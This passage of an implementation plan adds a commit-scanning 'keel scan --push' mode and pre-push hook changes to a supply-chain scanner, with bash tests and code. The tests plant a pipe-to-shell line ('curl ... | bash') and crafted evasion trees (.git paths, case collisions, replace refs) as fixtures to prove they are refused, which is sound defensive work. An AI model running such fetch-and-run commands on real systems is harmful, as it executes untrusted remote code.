# disk answered to it for .keel/SCAN-ALLOW, and a symlink by that name was written as a file holding
# its target, so either handed the scan an allow list the commit did not hold. The commit's own allow
# list, held as a file, is still honoured.
sp="$(fixture node-ts)"
kb="$( cd "$sp" && printf 'x\n' | git hash-object -w --stdin )"
al="$( cd "$sp" && printf 'secret.key an expired fixture\n' | git hash-object -w --stdin )"
ksub="$( cd "$sp" && printf '100644 blob %s\tSCAN-ALLOW\n' "$al" | git mktree )"
c="$( cd "$sp" && git commit-tree -m alias "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n' "$ksub" "$kb" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "honoured .keel/SCAN-ALLOW as the allow list" \
  || ok "scan --push honours no allow list the commit does not hold by its exact name"
lsub="$( cd "$sp" && printf '120000 blob %s\tscan-allow\n' "$al" | git mktree )"
c="$( cd "$sp" && git commit-tree -m link "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n' "$lsub" "$kb" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && bad "scan --push" "honoured a symlink named .keel/scan-allow as the allow list" \
  || ok "scan --push honours no allow list held as a symlink"
gsub="$( cd "$sp" && printf '100644 blob %s\tscan-allow\n' "$al" | git mktree )"
c="$( cd "$sp" && git commit-tree -m allowed "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n' "$gsub" "$kb" | git mktree)" )"
( cd "$sp" && "$KEEL" scan --push origin "$c" >/dev/null 2>&1 ) \
  && ok "scan --push honours an allow list the commit holds as a file" \
  || bad "scan --push" "refused a key the commit's own .keel/scan-allow lists"
# A history path with a . component names the tip's own file when looked up as <commit>:<path>, so a
# live key an intermediate commit held at ./secret.key read as the allowed fixture at secret.key.
( cd "$sp" && git update-ref refs/remotes/origin/main "$c" )
live="$( cd "$sp" && printf 'live\n' | git hash-object -w --stdin )"
dsub="$( cd "$sp" && printf '100644 blob %s\tsecret.key\n' "$live" | git mktree )"
mid="$( cd "$sp" && git commit-tree -p "$c" -m mid "$(printf '040000 tree %s\t.keel\n100644 blob %s\tsecret.key\n040000 tree %s\t.\n' "$gsub" "$kb" "$dsub" | git mktree)" )"
tip="$( cd "$sp" && git commit-tree -p "$mid" -m tip "$c^{tree}" )"
out="$( cd "$sp" && "$KEEL" scan --push origin "$tip" 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"./secret.key"*) ok "scan --push checks a history path with a . component outright" ;;
  *) bad "scan --push" "refused, but did not name ./secret.key: $out" ;; esac \
  || bad "scan --push" "allowed a live key an intermediate commit held at ./secret.key"
rm -rf "$sp"

# A SHA-256 repository is scanned, not refused: the scan repository names objects the way the pushed
# one does. This case passes before the change too, since the old scan read the working tree.
sp="$(mktemp -d)"
( cd "$sp" && git init -q --object-format=sha256 -b main . && git config user.email t@t.t && git config user.name t \
  && printf 'a\n' > a.txt && git add a.txt && git commit -qm init ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && ok "scan --push reads a SHA-256 repository" \
  || bad "scan --push" "refused a clean commit in a SHA-256 repository"
rm -rf "$sp"

# In a linked worktree git runs the hook with GIT_DIR set. The scan's own git commands must not
# write into that repository. The commit scanned is main, which holds a file the worktree's HEAD
# does not, so a git add that leaked into the worktree's index would show in its status. This case
# passes before the change too; it fails if the scan's git environment is not cleared.
sp="$(fixture node-ts)"
( cd "$sp" && git worktree add -q "$sp-wt" -b wt && printf 'b\n' > b.txt && git add b.txt && git commit -qm b ) >/dev/null 2>&1
( cd "$sp-wt" && GIT_DIR="$(git rev-parse --absolute-git-dir)" "$KEEL" scan --push origin main >/dev/null 2>&1 )
[ -z "$( cd "$sp-wt" && git status --porcelain )" ] \
  && ok "scan --push in a linked worktree leaves that worktree's index alone" \
  || bad "scan --push" "the linked worktree's status changed: $( cd "$sp-wt" && git status --porcelain | head -3 )"
rm -rf "$sp" "$sp-wt"

```

- [x] **Step 2: Run it and watch it fail**

Run: `tests/test-keel.sh`
Expected: FAIL. `cmd_scan` passes `--push` to the scanner, which ignores it and scans the working
tree, so these report, each prefixed `scan --push:`:

- `allowed a commit carrying a pipe-to-shell the working tree no longer holds`
- `exited 0 on a commit that does not exist`
- `refused a clean commit over an untracked file on disk`
- `allowed a payload the pushed tree marks export-ignore`
- `allowed a payload export-subst rewrites, behind a file named with a CR`
- `allowed a payload beside a path that differs from it only in case`
- `allowed a payload beside a directory that differs from it only in case`
- `allowed a commit holding .git/config`
- `allowed a commit holding .GIT/config`
- `allowed a push whose history carries deploy.key`
- `allowed a push whose history carries a changed deploy.key`
- `allowed a push whose merge commit added prod.key`
- `allowed TEST.key because the tip holds test.key`
- `passed a history git log could not read`
- `allowed a commit holding a .. path`
- `allowed A.key beside a.KEY`
- `allowed a push whose history turns a symlink into deploy.key`
- `allowed a key the tip replaced with a directory of the same name`
- `allowed a key a root commit added, with log.showRoot false`
- `allowed a payload a replace ref stands in front of`
- `allowed a directory beside a symlink of the same name folded`
- `allowed an executable beside a same-content file that differs only in case and mode`
- `honoured .keel/SCAN-ALLOW as the allow list`
- `honoured a symlink named .keel/scan-allow as the allow list`
- `allowed a live key an intermediate commit held at ./secret.key`

Twenty-five failures. The plain-scan, remote-holds-it, no-command, executable-bit, no-filter,
writes-nothing-outside, own-allow-list, SHA-256 and worktree cases pass, as their comments say.

- [x] **Step 3: Write the minimal implementation**

In `bin/keel`, replace `cmd_scan` in full:

```bash
cmd_scan() {
    [ -x "$SCANNER" ] || die "the supply chain scanner is missing from this install ($SCANNER)."
    if [ "${1:-}" = "--push" ]; then
        [ "$#" -eq 3 ] || die "usage: keel scan --push <remote> <commit>"
        scan_push "$2" "$3"
        return
    fi
    "$SCANNER" "$@"
}

# `keel scan --push <remote> <commit>` is what the pre-push hook runs, once per pushed commit. It
# scans the commit, never the working tree, which can hold a file the commit lacks or lack one it
# carries. Two parts: the commit's tree in full, and the key-file rule alone over every key file a
# commit in the push added, changed or changed the type of that the tip does not hold as a file,
# because git keeps a committed key in history and the push carries that history to the remote. It
# refuses, rather than scans in part, a commit it cannot write to disk faithfully.
scan_push() {   # scan_push <remote> <commit>
    local remote="$1" sha work tree objects fmt entry meta p mode type oid h i rc=0 allow_mode=""
    local paths=() oids=() fix=() bad=() hist=() look=()
    # Replace refs change what git reads and not what push sends, so none is followed anywhere here.
    export GIT_NO_REPLACE_OBJECTS=1
    sha="$(git rev-parse --verify --quiet "$2^{commit}" 2>/dev/null)" || die "'$2' is not a commit in this repository."
    objects="$(cd "$(git rev-parse --git-common-dir)" && pwd -P)/objects" || die "could not find this repository's objects."
    # The scan repository must name objects the way this one does, or a SHA-256 repository could
    # not be read. A git too old to answer echoes the flag back, and has only SHA-1.
    fmt="$(git rev-parse --show-object-format 2>/dev/null)"
    case "$fmt" in sha1|sha256) ;; *) fmt="" ;; esac
    work="$(mktemp -d)" || die "could not create a temporary directory for the scan."
    # Removed however this ends, a die or an interrupted hook included, since it holds a full copy
    # of the commit. Expanded now, since $work is local and gone by the time the trap runs.
    # shellcheck disable=SC2064
    trap "rm -rf '$work'" EXIT
    tree="$work/tree"
    mkdir "$tree" || die "could not create a temporary directory for the scan."
    say "scanning $sha, as pushed to $remote"
    while IFS= read -r -d '' entry; do
        meta="${entry%%$'\t'*}"; p="${entry#*$'\t'}"
        read -r mode type oid <<< "$meta"
        # git refuses to check out a path with a .git component, in any case, because it would
        # configure the repository it lands in, and a path with a ., .. or empty component, because
        # it would land outside or beside where it belongs; git mktree builds either. Refused here
        # before anything is written: a clone never holds one, and a .. path would put a file
        # anywhere this user can write.
        case "/$p/" in
            */[.][gG][iI][tT]/*|*/./*|*/../*|*//*) die "$sha holds '$p', a path git refuses to check out. Nothing was scanned." ;;
        esac
        # A submodule is a commit, whose content is not in this repository to scan.
        [ "$type" = blob ] || continue
        paths+=("$p"); oids+=("$oid")
        if [ "$p" = .keel/scan-allow ]; then allow_mode="$mode"; fi
    done < <(git ls-tree -r -z "$sha")
    # The copy gets a repository of its own, outside the copy, whose index is the commit's own tree:
    # names and modes come from the commit, never from what the disk kept, so A.key beside a.KEY on
    # a case-folding disk still reaches the key rule by its own name. checkout-index writes the
    # files, with the commit's .gitattributes out of the index meanwhile and no symlink written, so
    # the pushed tree chooses no filter command, no conversion, and nowhere outside the copy to
    # write. Every file is then checked against its blob, any that differs is written again from the
    # object store, and the check runs a second time. A file still wrong then is one this filesystem
    # cannot keep apart from another path, Payload.sh and payload.sh on a case-folding disk, or A.sh
    # beside a directory a.sh, and cannot be scanned.
    scan_push_in "$work" "$tree" scan_push_checkout "$sha" "$objects" "$fmt" \
      || die "could not write $sha's tree for the scanner. git refuses to write a path it will not check out, such as one it reads as .git on this filesystem, and that is the likely reason. Nothing was scanned."
    while IFS= read -r i; do fix+=("$i"); done < <(scan_push_mismatches "$tree")
    for i in "${!fix[@]}"; do
        scan_push_blob "$tree" "${paths[${fix[$i]}]}" "${oids[${fix[$i]}]}"
    done
    while IFS= read -r i; do bad+=("${paths[$i]}"); done < <(scan_push_mismatches "$tree")
    if [ "${#bad[@]}" -gt 0 ]; then
        err "$sha holds paths this filesystem cannot keep apart, such as two that differ only in case, so not all of them can be scanned. Refused rather than scanned in part:"
        for p in "${bad[@]}"; do err "  $p"; done
        return 1
    fi
    # .keel/scan-allow is read by name, and a case-folding disk answers to it for .keel/SCAN-ALLOW,
    # while a symlink by that name is written as a file holding its target's path. So an allow list
    # is honoured only where the commit holds that exact path as a file, and anything else the disk
    # answers to the name refuses the scan.
    if [ -e "$tree/.keel/scan-allow" ] && [ "$allow_mode" != 100644 ] && [ "$allow_mode" != 100755 ]; then
        err "$sha holds a path this filesystem reads as .keel/scan-allow, and not that file itself, so its allow list cannot be trusted. Nothing was scanned."
        return 1
    fi
    scan_push_in "$work" "$tree" "$SCANNER" || rc=1
    # Key files in the history the push carries that the tip does not hold as a file. The push is
    # every commit reachable from the tip and from no ref of <remote> fetched here, so a first push,
    # or a remote named by URL, which has no refs here, counts the tip's whole history. Added,
    # modified or changed in type, A, M and T: a key the remote already holds, changed in the push
    # and then deleted, sends the new key all the same. -c lists what a merge commit itself adds,
    # and --root what a root commit does. Plumbing, rev-list and diff-tree, because git log follows
    # porcelain configuration: with log.showRoot false it shows nothing a root commit added. The
    # walk's status is checked, since one that stops partway, on an object missing from a partial
    # clone, would otherwise read as a clean history.
    if ! git rev-list "$sha" --not --remotes="$remote" -- 2>/dev/null \
        | git diff-tree --stdin -r -c --root --no-commit-id --name-only --no-renames --diff-filter=AMT -z > "$work/log" 2>/dev/null; then
        err "could not read the history $sha carries, so its key files were not checked."
        return 1
    fi
    while IFS= read -r -d '' p; do
        if [ -n "$p" ]; then hist+=("$p"); fi
    done < "$work/log"
    # What the tip holds is looked up in the tip itself, exactly, case and all, never through a
    # filesystem that may fold case: TEST.key is not held because test.key is. Only a file counts:
    # a tip holding deploy.key/notes.txt does not hold the key a pushed commit added as deploy.key.
    # A name holding a newline cannot be looked up one per line, and one with a ., .. or empty
    # component would be read relative to the working directory, so each is checked outright, and so
    # is any path cat-file did not answer for.
    : > "$work/gone"
    for p in "${!hist[@]}"; do
        case "/${hist[$p]}/" in
            *$'\n'*|*/./*|*/../*|*//*) printf '%s\0' "${hist[$p]}" >> "$work/gone" ;;
            *) look+=("${hist[$p]}") ;;
        esac
    done
    if [ "${#look[@]}" -gt 0 ]; then
        i=0
        while IFS= read -r h; do
            [ "$h" = blob ] || printf '%s\0' "${look[$i]}" >> "$work/gone"
            i=$((i+1))
        done < <(for p in "${look[@]}"; do printf '%s:%s\n' "$sha" "$p"; done | git cat-file --batch-check='%(objecttype)' 2>/dev/null)
        while [ "$i" -lt "${#look[@]}" ]; do
            printf '%s\0' "${look[$i]}" >> "$work/gone"
            i=$((i+1))
        done
    fi
    ( cd "$tree" && "$SCANNER" --secret-paths < "$work/gone" ) || rc=1
    return "$rc"
}

# scan_push_in <work> <tree> <command>...: <command> run in <tree>, with git pointed at the scan's
# own repository and at nothing else. Every variable git reads to find or configure a repository is
# cleared first, from git's own list: a linked worktree's hook runs with GIT_DIR set, and
# GIT_CONFIG_PARAMETERS and its kin carry configuration. System and global configuration are left
# out too, so no filter or hook this user has configured runs over the pushed tree.
scan_push_in() {
    local work="$1" tree="$2" v
    shift 2
    (
        for v in $(git rev-parse --local-env-vars); do unset "$v"; done
        export GIT_DIR="$work/git" GIT_WORK_TREE="$tree" GIT_NO_REPLACE_OBJECTS=1 \
            GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null
        cd "$tree" || exit 1
        "$@"
    )
}

# scan_push_checkout <commit> <objects> <format>: run through scan_push_in. The scan repository,
# reading the pushed repository's objects in place, with the commit's tree as its index and on disk.
# The commit's .gitattributes leave the index while checkout-index writes, so they choose no filter,
# eol conversion or encoding; they come back with the rest when the index is read again, and on disk
# through scan_push_mismatches; matched in any case, since a case-folding disk reads
# A/.GITATTRIBUTES for a/. core.symlinks is off so checkout-index writes a symlink as the plain file
# git stores, its target's path: on a case-folding disk a symlink x can replace a directory X whose
# files are then written through it, outside the copy. core.fsmonitor and core.autocrlf are set here
# because on a git older than 2.32, which ignores GIT_CONFIG_GLOBAL, a global setting would still
# apply.
scan_push_checkout() {
    local sha="$1" objects="$2" fmt="$3" p
    git init -q ${fmt:+"--object-format=$fmt"} && git config core.fsmonitor false && git config core.autocrlf false \
      && git config core.symlinks false \
      && printf '%s\n' "$objects" > "$(git rev-parse --git-path objects/info/alternates)" \
      && git read-tree "$sha" || return 1
    git ls-files -z | while IFS= read -r -d '' p; do
        case "/$p" in */[.][gG][iI][tT][aA][tT][tT][rR][iI][bB][uU][tT][eE][sS]) printf '%s\0' "$p" ;; esac
    done | git update-index -z --force-remove --stdin || return 1
    # Its failures, a path this filesystem cannot write as the commit has it, are left to
    # scan_push_mismatches, which decides.
    git checkout-index -a -f 2>/dev/null
    git read-tree "$sha"
}

# scan_push_mismatches <dir>: one line per index into the caller's paths and oids whose file under
# <dir> is not exactly that blob. hash-object reads one path per line, drops a trailing CR from it,
# and stops at a file it cannot open; it also follows a symlink, which would read outside the tree.
# So a symlink, or anything not a plain file, is a mismatch outright, and a name holding a newline
# or a CR is hashed on its own. Any file the batch did not reach is a mismatch too.
scan_push_mismatches() {
    local dir="$1" i n h hidx=()
    for i in "${!paths[@]}"; do
        if [ -L "$dir/${paths[$i]}" ] || [ ! -f "$dir/${paths[$i]}" ]; then
            printf '%s\n' "$i"
        elif [[ "${paths[$i]}" == *$'\n'* || "${paths[$i]}" == *$'\r'* ]]; then
            [ "$(git hash-object --no-filters -- "$dir/${paths[$i]}" 2>/dev/null)" = "${oids[$i]}" ] || printf '%s\n' "$i"
        else
            hidx+=("$i")
        fi
    done
    [ "${#hidx[@]}" -gt 0 ] || return 0
    n=0
    while IFS= read -r h; do
        [ "$h" = "${oids[${hidx[$n]}]}" ] || printf '%s\n' "${hidx[$n]}"
        n=$((n+1))
    done < <(for i in "${hidx[@]}"; do printf '%s/%s\n' "$dir" "${paths[$i]}"; done | git hash-object --no-filters --stdin-paths 2>/dev/null)
    while [ "$n" -lt "${#hidx[@]}" ]; do
        printf '%s\n' "${hidx[$n]}"
        n=$((n+1))
    done
}

# scan_push_blob <dir> <path> <blob>: the blob's bytes at <dir>/<path>, as git stores them. Its
# failures are not checked here: the second scan_push_mismatches is what decides.
scan_push_blob() {
    {
        rm -f "$1/$2"
        mkdir -p "$(dirname "$1/$2")"
        git cat-file blob "$3" > "$1/$2"
    } 2>/dev/null
}
```

In the help text, replace the line
`        say "  scan                 supply chain scan of this tree; non-zero on any finding"` with:

```bash
        say "  scan                 supply chain scan of this tree; non-zero on any finding"
        say "  scan --push <remote> <commit>   the same scan of a commit being pushed, and of its history's key files"
```

Lint: run the shellcheck command from the global constraints.

In `tests/supply-chain-scan.sh`, the `--secret-paths` mode now also receives key files a pushed
commit changed, so replace the comment lines

```bash
# over this tree. keel scan --push feeds it every file a commit in the push added that the tip no
# longer holds: git keeps a committed key in history, so the push carries it to the remote though no
# tree being pushed shows it. Nothing else is scanned, since the tip's own tree is scanned in full
```

with

```bash
# over this tree. keel scan --push feeds it every file a commit in the push added or changed that the
# tip does not hold: git keeps a committed key in history, so the push carries it to the remote though
# no tree being pushed shows it. Nothing else is scanned, since the tip's own tree is scanned in full
```

and, in the `report` line of that mode, replace the words
`a key, keystore or certificate a commit in this push added and a later one deleted.` with
`a key, keystore or certificate in the history this push carries that its tip does not hold.`
Lint again.

In `docs/03-install-and-distribution.md`, immediately after the paragraph that begins
`Runs the supply chain scan over this tree: tracked files plus anything untracked` and ends
`` `tests/supply-chain-scan.sh` and the README. ``, insert:

````markdown

```bash
keel scan --push <remote> <commit>
```

Scans a commit instead of the working tree: the commit's own tree in full, and every key,
keystore or certificate file that a commit reachable from it, and from no ref of `<remote>`
fetched here, added or changed and the tip does not hold. git keeps such a file in history, so a
push carries it to the remote though the tip does not show it. Other content in those
intermediate commits is not scanned. It refuses, before scanning, a commit holding a path git
refuses to check out, one with a `.git`, `.`, `..` or empty component, and one holding paths this
filesystem cannot write apart, such as two that differ only in case and in content. The copy it
scans has the commit's own names and modes, and no filter or conversion the pushed
`.gitattributes` names is applied to it. An allow list counts only where the commit holds
`.keel/scan-allow` itself, as a file.
````

In `docs/standards.md`, replace

```markdown
**Example:** three suppressions exist, all in `tests/test-keel.sh`, where the tests that prove the
push guard rejects a pipe-to-shell must contain a pipe-to-shell. A suppression with no reason is
itself a finding.
```

with

```markdown
**Example:** most suppressions sit in `tests/test-keel.sh`, on the lines of tests that must
contain what they prove the push guard or `keel scan --push` rejects. A suppression with no reason
is itself a finding.
```

In `CHANGELOG.md`, add as the first bullet under `## Unreleased`:

```markdown
- `keel scan --push <remote> <commit>` scans a commit rather than the working tree: its tree, and
  any key, keystore or certificate file a commit not yet on `<remote>` added or changed and the tip
  does not hold. It refuses a commit holding a path git refuses to check out, or paths the
  filesystem cannot write apart.
```

- [x] **Step 4: Run it and watch it pass**

Run: `tests/test-keel.sh`
Expected: PASS, with every `scan --push` case above reporting PASS and a final line with 0 failed.

Then run `tests/validate-citations.sh` and repair what it reports, per the global constraints.

- [x] **Step 5: Run the suite at the unit boundary, then hand over**

Run: `tests/run-tests.sh`
Expected: `All test files passed`, or reds this task did not cause, each named and matched against
the start record. This is the one suite run the task schedules.

```bash
git add bin/keel tests/test-keel.sh tests/supply-chain-scan.sh docs/03-install-and-distribution.md \
        docs/standards.md CHANGELOG.md
git status --porcelain
```

Stage exactly those paths and stop. **Do not commit.** The coordinator commits after both review
passes, with `git commit -m "feat(scan): keel scan --push scans a commit and the key files its history carries"`.
Paste the `git status --porcelain` output into your report; if it lists anything this task did not
touch, say so and leave it unstaged.

---

### Task 3: The pre-push hook scans what it pushes, with the installed keel only

**Story:** none; the idea record's recommendation and the first two decisions above.

**Revised 2026-09-27 after the first attempt was rejected.** Its quality review found, by real
pushes through the generated hook, that a keel on PATH older than the hook, such as the released
v0.21.0, ignores `--push`, scans the working tree and reads as a clean scan of the push: a silent
false pass. The maintainer chose that an older keel says so and scans the working tree, as the
hook did before. The same review found that git's empty stdin, on a push with nothing to update,
was taken for a run by hand and scanned the working tree, and that a branch and an annotated tag
on one commit were scanned twice. The hook now tells a run by hand by its missing arguments,
which git always passes, and peels each pushed sha to its commit before deduplicating. The first
attempt was discarded unstaged.

**Revised again 2026-09-28 after the second attempt was rejected.** Its quality review found one
blocking defect, reproduced with a real push: the new peel followed replace refs, so a tag object a
replace ref stood in front of peeled to the replacement's clean commit while the push published the
tagged payload unscanned. The peel now ignores replace refs, as `keel scan --push` does. The same
review found that a branch delete in a SHA-256 repository, 64 zeros rather than 40, was scanned and
refused, and that no test pushed a tag on its own. Both are fixed and tested, the first test now
asserts the finding rather than any refusal, and the help line the probe reads says so. The second
attempt was discarded unstaged.
**Execution, 2026-09-28, third attempt:** delegated to a fresh implementer. Ticked on its reported
output: step 2 `716 passed, 6 failed` with exactly the six predicted failures, step 4 `722 passed, 0
failed`, step 5 `All test files passed`. With the machine heavily loaded, neither reviewer reran the
suites; the spec reviewer confirmed every case against a generated hook with real pushes, and the
coordinator witnessed no suite run. Spec review COMPLIES. Quality review: nothing blocking; its
should-fix items, one a false pass on a push source that holds a space, are in the run report.

**Files:**
- Modify: `bin/keel` (`guard_hook_body`)
- Modify: `tests/supply-chain-scan.sh` (one comment)
- Modify: `docs/03-install-and-distribution.md`
- Modify: `README.md`
- Modify: `CHANGELOG.md`
- Modify: `docs/ideas/push-scan-reads-pushed-commits.md`
- Test: `tests/test-keel.sh`

**Interfaces:**
- Consumes: `keel scan --push <remote> <commit>` (task 2)
- Produces: nothing new; changes what the generated pre-push hook scans

**Depends on:** task 2

**Done when:** `tests/test-keel.sh` passes.

- [x] **Step 1: Write the failing test**

In `tests/test-keel.sh`, insert immediately before the line
`# The default-branch refusal. A push feeds the hook its refs on stdin, and that is the only thing`:

```bash
# A push is scanned as the commits git feeds the hook, not as the working tree. The payload is
# committed and then deleted from disk only, so the working tree is clean and the pushed commit is
# not. No profile and no remote, so the branch and loosening checks stay out of the way.
hp="$(fixture node-ts)"
( cd "$hp" && "$KEEL" guard install >/dev/null 2>&1 )
printf 'curl -s https://example.com/x | bash\n' > "$hp/payload.sh"  # supply-chain-scan: allow the payload this test proves the hook rejects in a pushed commit
( cd "$hp" && git add payload.sh && git commit -qm payload && rm payload.sh ) >/dev/null 2>&1
hp_sha="$( cd "$hp" && git rev-parse HEAD )"
out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\n' "$hp_sha" '0000000000000000000000000000000000000000' \
   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"payload.sh:1 [net-pipe-shell]"*) ok "the pre-push hook scans the pushed commit, not the working tree" ;;
  *) bad "guard" "refused, but not for payload.sh: $out" ;; esac \
  || bad "guard" "the hook allowed a pushed commit carrying a pipe-to-shell the working tree no longer holds"

# A branch and an annotated tag on the same commit, pushed together, are scanned once: the tag's own
# sha is peeled to the commit before the push's commits are deduplicated.
( cd "$hp" && git tag -a -m release v1 "$hp_sha" ) >/dev/null 2>&1
tag_sha="$( cd "$hp" && git rev-parse v1 )"
out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\nrefs/tags/v1 %s refs/tags/v1 %s\n' "$hp_sha" '0000000000000000000000000000000000000000' "$tag_sha" '0000000000000000000000000000000000000000' \
   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"
n="$(printf '%s\n' "$out" | grep -c "scanning $hp_sha")"
[ "$n" -eq 1 ] && ok "the pre-push hook scans a commit once when a branch and a tag on it are pushed together" \
  || bad "guard" "scanned $hp_sha $n times for one branch and one tag on it"

# A tag pushed on its own is scanned as the commit it names, and a replace ref standing in front of
# the tag object changes nothing: the peel ignores replace refs, as keel scan --push does, since
# they change what git reads and not what push sends.
clean_c="$( cd "$hp" && git commit-tree -m clean "$hp_sha~1^{tree}" )"
( cd "$hp" && git tag -a -m release v2 "$hp_sha" ) >/dev/null 2>&1
v2="$( cd "$hp" && git rev-parse v2 )"
fake="$( cd "$hp" && printf 'object %s\ntype commit\ntag v2\ntagger t <t@t.t> 0 +0000\n\nfake\n' "$clean_c" | git mktag )"
( cd "$hp" && git replace -f "$v2" "$fake" ) >/dev/null 2>&1
( cd "$hp" && printf 'refs/tags/v2 %s refs/tags/v2 %s\n' "$v2" '0000000000000000000000000000000000000000' \
   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
  && bad "guard" "the hook allowed a tagged payload a replace ref stands in front of" \
  || ok "the pre-push hook scans a pushed tag as the commit it really names"
( cd "$hp" && git replace -d "$v2" ) >/dev/null 2>&1

# A push that only deletes a branch sends no content, so there is nothing to scan.
( cd "$hp" && printf '(delete) %s refs/heads/topic %s\n' '0000000000000000000000000000000000000000' "$hp_sha" \
   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
  && ok "the pre-push hook allows a push that only deletes a branch" \
  || bad "guard" "the hook refused a push that only deletes a branch"

# A branch delete in a SHA-256 repository sends 64 zeros, not 40, and is still a delete. This case
# passes before the change too, since today's hook scans a clean working tree.
s256="$(mktemp -d)"
( cd "$s256" && git init -q --object-format=sha256 -b main . && git config user.email t@t.t && git config user.name t \
  && printf 'a\n' > a.txt && git add a.txt && git commit -qm init && "$KEEL" guard install ) >/dev/null 2>&1
z64='0000000000000000000000000000000000000000000000000000000000000000'
( cd "$s256" && printf '(delete) %s refs/heads/old %s\n' "$z64" "$(git rev-parse HEAD)" \
   | PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 ) \
  && ok "the pre-push hook allows a branch delete in a SHA-256 repository" \
  || bad "guard" "the hook refused a branch delete in a SHA-256 repository"
rm -rf "$s256"

# git runs the hook with its two arguments and nothing on stdin when there is nothing to update. That
# publishes nothing, so nothing is scanned: an untracked payload on disk refused a no-op push.
printf 'curl -s https://example.com/x | bash\n' > "$hp/scratch.sh"  # supply-chain-scan: allow an untracked payload a push with nothing to update must not read
( cd "$hp" && PATH="$(dirname "$KEEL"):$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git </dev/null >/dev/null 2>&1 ) \
  && ok "the pre-push hook scans nothing when git feeds it no refs" \
  || bad "guard" "the hook refused a push with nothing to update over an untracked file on disk"
rm -f "$hp/scratch.sh"

# A keel on PATH older than the hook has no --push, ignores it, and scans the working tree while
# reading as a clean scan of the push. The hook asks first, says so, and scans the working tree with
# it. A stub stands in for the older keel, recording how it is called.
old_bin="$(mktemp -d)"
printf '#!/bin/sh\ncase "$1" in\n    --help) echo "  scan                 supply chain scan of this tree" ;;\n    scan) echo "OLD-KEEL-SCAN $*" ;;\nesac\n' > "$old_bin/keel"
chmod +x "$old_bin/keel"
out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\n' "$hp_sha" '0000000000000000000000000000000000000000' \
   | PATH="$old_bin:$PATH" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"
case "$out" in
    *"OLD-KEEL-SCAN scan --push"*) bad "guard" "the hook handed --push to a keel too old to know it" ;;
    *"too old"*)
        case "$out" in
            *"OLD-KEEL-SCAN scan"*) ok "the pre-push hook says a keel is too old for --push, and scans the working tree with it" ;;
            *) bad "guard" "said keel was too old but scanned nothing: $out" ;;
        esac ;;
    *) bad "guard" "expected the too-old message, got: $out" ;;
esac
rm -rf "$old_bin"

# The repository's own tests/supply-chain-scan.sh is never the scanner, even with no keel on PATH:
# a branch would otherwise be judged by its own, possibly weakened, copy. PATH is cut to the system
# directories so no keel is reachable.
mkdir -p "$hp/tests"
printf '#!/bin/sh\necho REPO-SCANNER-RAN\nexit 0\n' > "$hp/tests/supply-chain-scan.sh"
chmod +x "$hp/tests/supply-chain-scan.sh"
out="$( cd "$hp" && printf 'refs/heads/topic %s refs/heads/topic %s\n' "$hp_sha" '0000000000000000000000000000000000000000' \
   | PATH="/usr/bin:/bin" .git/hooks/pre-push origin git@example.invalid:gbi/f.git 2>&1 )"; rc=$?
if [ "$rc" -ne 0 ]; then bad "guard" "the hook refused with no keel on PATH: $out"
else case "$out" in
    *REPO-SCANNER-RAN*) bad "guard" "the hook ran the repository's own scanner" ;;
    *"not on PATH"*) ok "the pre-push hook never runs the repository's own scanner, and says when nothing was scanned" ;;
    *) bad "guard" "expected the no-keel message, got: $out" ;;
esac; fi
rm -rf "$hp"

```

- [x] **Step 2: Run it and watch it fail**

Run: `tests/test-keel.sh`
Expected: FAIL, six failures, each prefixed `guard:`:

- `the hook allowed a pushed commit carrying a pipe-to-shell the working tree no longer holds`
- `scanned <sha> 0 times for one branch and one tag on it`, since today's hook never runs
  `keel scan --push`, which is what prints `scanning <sha>`
- `the hook allowed a tagged payload a replace ref stands in front of`
- `the hook refused a push with nothing to update over an untracked file on disk`
- `expected the too-old message, got: keel guard: scanning before push` followed by
  `OLD-KEEL-SCAN scan`, since today's hook calls the stub with plain `scan`
- `the hook ran the repository's own scanner`

The delete-only and SHA-256 delete cases pass before the change too, since today's hook scans a
working tree that is clean.

- [x] **Step 3: Write the minimal implementation**

In `bin/keel`, inside `guard_hook_body`:

(a) Immediately before the line
`# Only when git is feeding the hook. A push supplies its refs on stdin; run by hand from a terminal`,
insert:

```bash
# The commits the push sends, each once: the scan at the end reads them.
pushed=""
```

(b) Replace the line `    while read -r _lref lsha rref rsha; do` with:

```bash
    while read -r _lref lsha rref rsha; do
        # A branch delete, a local sha of all zeros, 40 of them or a SHA-256 repository's 64, sends
        # no content. A commit pushed under two refs, a branch and an annotated tag on it, is
        # scanned once: a tag's own sha is peeled to its commit, and one that does not peel is kept
        # as it is, so the scan still refuses it. The peel ignores replace refs, as keel scan --push
        # does: they change what git reads and not what push sends, so a replaced tag object would
        # peel to the replacement's commit.
        case "$lsha" in
            *[!0]*)
                commit="$(GIT_NO_REPLACE_OBJECTS=1 git rev-parse --verify --quiet "$lsha^{commit}" 2>/dev/null)" || commit="$lsha"
                case " $pushed " in *" $commit "*) ;; *) pushed="$pushed $commit" ;; esac ;;
        esac
```

(c) Replace

```bash
if command -v keel >/dev/null 2>&1; then
    SCAN="keel scan"
elif [ -x tests/supply-chain-scan.sh ]; then
